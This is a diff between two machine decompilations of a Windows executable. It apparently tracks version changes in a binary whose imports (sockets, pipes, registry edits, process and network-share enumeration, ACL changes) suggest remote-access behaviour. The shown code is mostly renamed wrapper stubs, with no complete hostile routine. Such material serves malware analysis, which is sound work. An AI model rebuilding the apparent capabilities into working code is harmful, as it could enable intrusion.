+    return v2 == 0;
 }
 
-// Address range: 0x405957 - 0x4059b1
-int32_t function_405957(int32_t * hKey, int32_t lpSubKey, int32_t lpSubKey2) {
+// Address range: 0x405957 - 0x4059b2
+int32_t function_405957(int32_t * hKey, int32_t a2, int32_t lpSubKey2) {
     int32_t phkResult2 = (int32_t)hKey;
-    struct _SECURITY_ATTRIBUTES * phkResult = (struct _SECURITY_ATTRIBUTES *)lpSubKey;
+    char * lpSubKey = (char *)a2;
+    char * phkResult = lpSubKey;
     int32_t Reserved = 0; // edi
+    int32_t v1; // 0x4059ae
     int32_t result; // 0x4059b1
-    if (RegOpenKeyExA(hKey, (char *)lpSubKey, 0, 0xf003f, (int32_t **)&phkResult) == 0) {
-        int32_t v1 = *(int32_t *)&phkResult; // 0x40598b11
-        int32_t v2 = RegCreateKeyExA(&((struct _SECURITY_ATTRIBUTES *)v1)->e0, (char *)lpSubKey2, Reserved, (char *)Reserved, Reserved, 0xf003f, (struct _SECURITY_ATTRIBUTES *)Reserved, (int32_t **)&phkResult2, (int32_t *)Reserved); // 0x40598e
-        RegCloseKey(&phkResult->e0);
+    if (RegOpenKeyExA(hKey, lpSubKey, 0, 0xf003f, (int32_t **)&phkResult) == 0) {
+        int32_t hKey2 = *(int32_t *)&phkResult; // 0x40598b13
+        int32_t v2 = RegCreateKeyExA((int32_t *)hKey2, (char *)lpSubKey2, Reserved, (char *)Reserved, Reserved, 0xf003f, (struct _SECURITY_ATTRIBUTES *)Reserved, (int32_t **)&phkResult2, (int32_t *)Reserved); // 0x40598e
+        int32_t hKey3 = *(int32_t *)&phkResult; // 0x40599414
+        char * v3 = NULL; // bp-76
+        *(int32_t *)&v3 = hKey3;
+        RegCloseKey((int32_t *)hKey3);
         RegCloseKey((int32_t *)phkResult2);
+        g3 = phkResult2;
         result = v2 == Reserved;
+        v1 = (int32_t)&v3;
         // branch -> 0x4059ae
     } else {
         // 0x405979
         result = 0;
+        v1 = g8;
         // branch -> 0x4059ae
     }
     // 0x4059ae
+    g5 = *(int32_t *)v1;
+    g7 = *(int32_t *)(v1 + 4);
+    g2 = *(int32_t *)(v1 + 8);
     return result;
 }
 
-// Address range: 0x4059b2 - 0x4059b7
-int32_t _SetSecurityInfo(int32_t * handle, int32_t ObjectType, int32_t SecurityInfo, int32_t * psidOwner, int32_t * psidGroup, struct _ACL * pDacl, struct _ACL * pSacl) {
+// Address range: 0x4059b2 - 0x4059b8
+int32_t function_4059b2(int32_t * handle, int32_t ObjectType, int32_t SecurityInfo, int32_t * psidOwner, int32_t * psidGroup, struct _ACL * pDacl, struct _ACL * pSacl) {
     // 0x4059b2
     return SetSecurityInfo(handle, ObjectType, SecurityInfo, psidOwner, psidGroup, pDacl, pSacl);
 }
 
-// Address range: 0x4059b8 - 0x4059bd
-int32_t _SetEntriesInAclA(int32_t cCountOfExplicitEntries, struct _EXPLICIT_ACCESS_A * pListOfExplicitEntries, struct _ACL * OldAcl, struct _ACL ** NewAcl) {
+// Address range: 0x4059b8 - 0x4059be
+int32_t function_4059b8(int32_t cCountOfExplicitEntries, struct _EXPLICIT_ACCESS_A * pListOfExplicitEntries, struct _ACL * OldAcl, struct _ACL ** NewAcl) {
     // 0x4059b8
     return SetEntriesInAclA(cCountOfExplicitEntries, pListOfExplicitEntries, OldAcl, NewAcl);
 }
 
-// Address range: 0x4059be - 0x4059c3
-int32_t _WNetCloseEnum(int32_t * hEnum) {
+// Address range: 0x4059be - 0x4059c4
+int32_t function_4059be(int32_t * hEnum) {
     // 0x4059be
     return WNetCloseEnum(hEnum);
 }
 
-// Address range: 0x4059c4 - 0x4059c9
-int32_t _WNetEnumResourceA(int32_t * hEnum, int32_t * lpcCount, int32_t * lpBuffer, int32_t * lpBufferSize) {
+// Address range: 0x4059c4 - 0x4059ca
+int32_t function_4059c4(int32_t * hEnum, int32_t * lpcCount, int32_t * lpBuffer, int32_t * lpBufferSize) {
     // 0x4059c4
     return WNetEnumResourceA(hEnum, lpcCount, lpBuffer, lpBufferSize);
 }
 
-// Address range: 0x4059ca - 0x4059cf
-int32_t _WNetOpenEnumA(int32_t dwScope, int32_t dwType, int32_t dwUsage, struct _NETRESOURCEA * lpNetResource, int32_t ** lphEnum) {
+// Address range: 0x4059ca - 0x4059d0
+int32_t function_4059ca(int32_t dwScope, int32_t dwType, int32_t dwUsage, struct _NETRESOURCEA * lpNetResource, int32_t ** lphEnum) {
     // 0x4059ca
     return WNetOpenEnumA(dwScope, dwType, dwUsage, lpNetResource, lphEnum);
 }
 
-// Address range: 0x4059d0 - 0x4059df
-int32_t ___CxxFrameHandler(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC) {
+// Address range: 0x4059d0 - 0x4059d6
+int32_t function_4059d0(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC) {
     // 0x4059d0
     return __CxxFrameHandler(pExcept, pRN, pContext, pDC);
 }
 
-// Address range: 0x4059e0 - 0x4059e5
-int32_t __EH_prolog(void) {
+// Address range: 0x4059e0 - 0x4059e6
+int32_t function_4059e0(void) {
     // 0x4059e0
     return _EH_prolog();
 }
 
-// Address range: 0x4059e6 - 0x4059eb
-char * _strcat(char * dest, char * src) {
+// Address range: 0x4059e6 - 0x4059ec
+char * function_4059e6(char * dest, char * src) {
     // 0x4059e6
     return strcat(dest, src);
 }
 
-// Address range: 0x4059ec - 0x4059f1
-char * _strcpy(char * dest, char * src) {
+// Address range: 0x4059ec - 0x4059f2
+char * function_4059ec(char * dest, char * src) {
     // 0x4059ec
     return strcpy(dest, src);
 }
 
-// Address range: 0x4059f2 - 0x4059f7
-int32_t _strlen(char * s) {
+// Address range: 0x4059f2 - 0x4059f8
+int32_t function_4059f2(char * s) {
     // 0x4059f2
     return strlen(s);
 }
 
-// Address range: 0x4059f8 - 0x4059fd
-int32_t * _memset(int32_t * s, int32_t c, int32_t n) {
+// Address range: 0x4059f8 - 0x4059fe
+int32_t * function_4059f8(int32_t * s, int32_t c, int32_t n) {
     // 0x4059f8
     return memset(s, c, n);
 }
 
-// Address range: 0x4059fe - 0x405a0f
-int32_t * _memcpy_1(int32_t * dest, int32_t * src, int32_t n) {
+// Address range: 0x4059fe - 0x405a04
+int32_t * function_4059fe(int32_t * dest, int32_t * src, int32_t n) {
     // 0x4059fe
     return memcpy(dest, src, n);
 }
 
 // Address range: 0x405a10 - 0x405a3f
 int32_t function_405a10(void) {
-    // 0x405a10
-    int32_t v1;
-    int32_t v2 = &v1; // 0x405a16
-    int32_t result;
+    int32_t v1 = g4; // 0x405a10
+    int32_t v2 = v1; // bp-4
+    int32_t result = &v2; // 0x405a10
     if (g1 < 0x1000) {
         // 0x405a30
-        *(int32_t *)(v2 - g1 - 4) = result;
+        g4 = v1;
         return result;
     }
-    int32_t v3 = v2 - 0x1000; // 0x405a1c
-    int32_t v4 = g1 - 0x1000; // 0x405a22
-    while (v4 >= 0x1000) {
+    int32_t v3 = g1; // 0x405a22
+    int32_t v4;
+    int32_t v5 = &v4; // 0x405a1c
+    while (v3 >= 0x2000) {
         // 0x405a1c
         v3 -= 0x1000;
-        v4 -= 0x1000;
+        v5 -= 0x1000;
         // continue -> 0x405a1c
     }
     // 0x405a30
     // branch -> 0x405a30
     // 0x405a30
-    *(int32_t *)(v3 - v4 - 4) = result;
+    g4 = v1;
     return result;
 }
 
-// Address range: 0x405a40 - 0x405a45
-int32_t _strcmp(char * s1, char * s2) {
+// Address range: 0x405a40 - 0x405a46
+int32_t function_405a40(char * s1, char * s2) {
     // 0x405a40
     return strcmp(s1, s2);
 }
 
-// Address range: 0x405a46 - 0x405b83
+// Address range: 0x405a46 - 0x405b84
 int32_t entry_point(void) {
-    // entry
+    // 0x405a46
     abort();
     // UNREACHABLE
 }
 
-// Address range: 0x405b84 - 0x405b97
+// Address range: 0x405b84 - 0x405b98
 int32_t function_405b84(void) {
-    int32_t v1 = *(int32_t *)(g2 - 20); // 0x405b84
-    int32_t v2 = *(int32_t *)*(int32_t *)v1; // 0x405b89
-    *(int32_t *)(g2 - 120) = v2;
-    return _XcptFilter(v2, (int32_t *)v1);
+    int32_t v1 = 0; // ebp
+    int32_t v2 = *(int32_t *)(v1 - 20); // 0x405b84
+    int32_t v3 = *(int32_t *)*(int32_t *)v2; // 0x405b89
+    *(int32_t *)(v1 - 120) = v3;
+    return _XcptFilter(v3, (int32_t *)v2);
 }
 
-// Address range: 0x405b98 - 0x405ba3
-void function_405b98(int32_t Code) {
-    // 0x405b98
-    *(int32_t *)(*(int32_t *)(g2 - 24) - 4) = *(int32_t *)(g2 - 120);
-    _exit(Code);
-}
-
-// Address range: 0x405ba4 - 0x405ba9
-int32_t __XcptFilter(int32_t xcptnum, int32_t * pxcptinfoptrs) {
+// Address range: 0x405ba4 - 0x405baa
+int32_t function_405ba4(int32_t xcptnum, int32_t * pxcptinfoptrs) {
     // 0x405ba4
     return _XcptFilter(xcptnum, pxcptinfoptrs);
 }
 
-// Address range: 0x405baa - 0x405baf
-void __initterm(void (**First)(), void (**Last)()) {
+// Address range: 0x405baa - 0x405bb0
+void function_405baa(void (**First)(), void (**Last)()) {
     // 0x405baa
     _initterm(First, Last);
 }
 
-// Address range: 0x405bb0 - 0x405bc4
-int32_t function_405bb0(void) {
-    // 0x405bb0
-    return _controlfp(0x10000, 0x30000);
+// Address range: 0x405bc2 - 0x405bc5
+int32_t function_405bc2(void) {
+    // 0x405bc2
+    return 0;
 }
 
-// Address range: 0x405bc5 - 0x405bc5
+// Address range: 0x405bc5 - 0x405bc6
 int32_t function_405bc5(void) {
     // 0x405bc5
     return g1;
 }
 
-// Address range: 0x405bc6 - 0x405bcb
-int32_t __except_handler3(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher) {
+// Address range: 0x405bc6 - 0x405bcc
+int32_t function_405bc6(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher) {
     // 0x405bc6
     return _except_handler3(exception_record, registration, context, dispatcher);
 }
 
-// Address range: 0x405bcc - 0x405bdf
+// Address range: 0x405bcc - 0x405bd2
 int32_t __controlfp(int32_t NewValue, int32_t Mask) {
     // 0x405bcc
     return _controlfp(NewValue, Mask);
 }
 
-// Address range: 0x405be0 - 0x405be5
-bool _Process32Next(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe) {
+// Address range: 0x405be0 - 0x405be6
+bool function_405be0(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe) {
     // 0x405be0
     return Process32Next(hSnapshot, lppe);
 }
 
-// Address range: 0x405be6 - 0x405beb
-bool _Process32First(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe) {
+// Address range: 0x405be6 - 0x405bec
+bool function_405be6(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe) {
     // 0x405be6
     return Process32First(hSnapshot, lppe);
 }
 
-// Address range: 0x405bec - 0x405bf3
-int32_t * _CreateToolhelp32Snapshot(int32_t dwFlags, int32_t th32ProcessID) {
+// Address range: 0x405bec - 0x405bf2
+int32_t * function_405bec(int32_t dwFlags, int32_t th32ProcessID) {
     // 0x405bec
     return CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
 }
 
-// Address range: 0x405bf4 - 0x405bfd
+// Address range: 0x405bf4 - 0x405bfe
 int32_t function_405bf4(void) {
     // 0x405bf4
     int32_t * v1;
@@ -5651,7 +9301,6 @@ int32_t function_405bf4(void) {
 // unsigned int __cdecl _controlfp(_In_ unsigned int NewValue, _In_ unsigned int Mask);
 // int32_t _EH_prolog(void);
 // int _except_handler3(PEXCEPTION_RECORD exception_record, PEXCEPTION_REGISTRATION registration, PCONTEXT context, PEXCEPTION_REGISTRATION dispatcher);
-// void __cdecl _exit(_In_ int Code);
 // void __cdecl _initterm(_In_ _PVFV * First, _In_ _PVFV * Last);
 // char * _itoa(int value, char * str, int radix);
 // int __cdecl _strnicmp(char const * String1, char const * String2, _In_ size_t MaxCount);
@@ -5666,25 +9315,33 @@ int32_t function_405bf4(void) {
 // HANDLE CreateEventA(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCSTR lpName);
 // HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
 // HANDLE CreateMutexA(_In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_ BOOL bInitialOwner, _In_opt_ LPCSTR lpName);
+// BOOL CreatePipe(_Out_ PHANDLE hReadPipe, _Out_ PHANDLE hWritePipe, _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes, _In_ DWORD nSize);
 // BOOL CreateProcessA(_In_opt_ LPCSTR lpApplicationName, _Inout_opt_ LPSTR lpCommandLine, _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment, _In_opt_ LPCSTR lpCurrentDirectory, _In_ LPSTARTUPINFOA lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation);
 // HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
 // HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
 // BOOL DeleteFileA(_In_ LPCSTR lpFileName);
 // BOOL DuplicateHandle(_In_ HANDLE hSourceProcessHandle, _In_ HANDLE hSourceHandle, _In_ HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwOptions);
 // VOID ExitProcess(_In_ UINT uExitCode);
+// int fclose(FILE * stream);
 // BOOL FindClose(_Inout_ HANDLE hFindFile);
 // HANDLE FindFirstFileA(_In_ LPCSTR lpFileName, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
 // BOOL FindNextFileA(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
+// FILE * fopen(const char * restrict filename, const char * restrict modes);
+// size_t fread(void * restrict ptr, size_t size, size_t n, FILE * restrict stream);
 // void free(void * ptr);
 // BOOL FreeLibrary(_In_ HMODULE hLibModule);
+// int fseek(FILE * stream, long int off, int whence);
+// size_t fwrite(const void * restrict ptr, size_t size, size_t n, FILE * restrict s);
 // BOOL GetComputerNameA(LPSTR lpBuffer, _Inout_ LPDWORD nSize);
 // HANDLE GetCurrentProcess(VOID);
 // UINT GetDriveTypeA(_In_opt_ LPCSTR lpRootPathName);
 // DWORD GetFileAttributesA(_In_ LPCSTR lpFileName);
+// DWORD GetFileSize(_In_ HANDLE hFile, _Out_opt_ LPDWORD lpFileSizeHigh);
 // BOOL GetFileTime(_In_ HANDLE hFile, _Out_opt_ LPFILETIME lpCreationTime, _Out_opt_ LPFILETIME lpLastAccessTime, _Out_opt_ LPFILETIME lpLastWriteTime);
 // struct hostent * gethostbyname(_In_z_ const char * name);
 // int gethostname(char * name, _In_ int namelen);
 // DWORD GetLastError(VOID);
+// VOID GetLocalTime(_Out_ LPSYSTEMTIME lpSystemTime);
 // DWORD GetLogicalDriveStringsA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
 // DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
 // DWORD GetPriorityClass(_In_ HANDLE hProcess);
@@ -5713,16 +9370,22 @@ int32_t function_405bf4(void) {
 // HANDLE OpenMutexA(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCSTR lpName);
 // HANDLE OpenProcess(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);
 // BOOL OpenProcessToken(_In_ HANDLE ProcessHandle, _In_ DWORD DesiredAccess, PHANDLE TokenHandle);
+// BOOL PeekNamedPipe(_In_ HANDLE hNamedPipe, LPVOID lpBuffer, _In_ DWORD nBufferSize, _Out_opt_ LPDWORD lpBytesRead, _Out_opt_ LPDWORD lpTotalBytesAvail, _Out_opt_ LPDWORD lpBytesLeftThisMessage);
 // BOOL Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
 // BOOL Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
 // int rand(void);
+// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
 // int recv(_In_ SOCKET s, char * buf, _In_ int len, _In_ int flags);
 // LSTATUS RegCloseKey(_In_ HKEY hKey);
 // LSTATUS RegCreateKeyExA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey, DWORD Reserved, _In_opt_ LPSTR lpClass, _In_ DWORD dwOptions, _In_ REGSAM samDesired, _In_opt_ const LPSECURITY_ATTRIBUTES lpSecurityAttributes, _Out_ PHKEY phkResult, _Out_opt_ LPDWORD lpdwDisposition);
 // LSTATUS RegDeleteValueA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName);
+// LSTATUS RegEnumKeyExA(_In_ HKEY hKey, _In_ DWORD dwIndex, LPSTR lpName, _Inout_ LPDWORD lpcchName, LPDWORD lpReserved, LPSTR lpClass, _Inout_opt_ LPDWORD lpcchClass, _Out_opt_ PFILETIME lpftLastWriteTime);
+// LSTATUS RegEnumValueA(_In_ HKEY hKey, _In_ DWORD dwIndex, LPSTR lpValueName, _Inout_ LPDWORD lpcchValueName, LPDWORD lpReserved, _Out_opt_ LPDWORD lpType, LPBYTE lpData, _Inout_opt_ LPDWORD lpcbData);
 // LSTATUS RegOpenKeyExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
 // LSTATUS RegQueryValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, LPDWORD lpReserved, _Out_opt_ LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
 // LSTATUS RegSetValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
+// BOOL RemoveDirectoryA(_In_ LPCSTR lpPathName);
+// int rename(const char * old, const char * new);
 // int select(_In_ int nfds, _Inout_opt_ fd_set * readfds, _Inout_opt_ fd_set * writefds, _Inout_opt_ fd_set * exceptfds, _In_opt_ const struct timeval * timeout);
 // int send(_In_ SOCKET s, const char * buf, _In_ int len, _In_ int flags);
 // DWORD SetEntriesInAclA(_In_ ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_A pListOfExplicitEntries, _In_opt_ PACL OldAcl, _Out_ PACL * NewAcl);
@@ -5730,6 +9393,7 @@ int32_t function_405bf4(void) {
 // BOOL SetFileAttributesA(_In_ LPCSTR lpFileName, _In_ DWORD dwFileAttributes);
 // BOOL SetFileTime(_In_ HANDLE hFile, _In_opt_ const FILETIME * lpCreationTime, _In_opt_ const FILETIME * lpLastAccessTime, _In_opt_ const FILETIME * lpLastWriteTime);
 // DWORD SetSecurityInfo(_In_ HANDLE handle, _In_ SE_OBJECT_TYPE ObjectType, _In_ SECURITY_INFORMATION SecurityInfo, _In_opt_ PSID psidOwner, _In_opt_ PSID psidGroup, _In_opt_ PACL pDacl, _In_opt_ PACL pSacl);
+// LSTATUS SHDeleteKeyA(_In_ HKEY hkey, _In_opt_ LPCSTR pszSubKey);
 // VOID Sleep(_In_ DWORD dwMilliseconds);
 // SOCKET socket(_In_ int af, _In_ int type, _In_ int protocol);
 // int sprintf(char * restrict s, const char * restrict format, ...);
@@ -5756,5 +9420,5 @@ int32_t function_405bf4(void) {
 
 // Detected compiler/packer: microsoft linker (6.0)
 // Detected language: C++
-// Detected functions: 88
-// Decompilation date: 2018-03-28 18:37:18
+// Detected functions: 124
+// Decompilation date: 2018-06-08 14:15:18
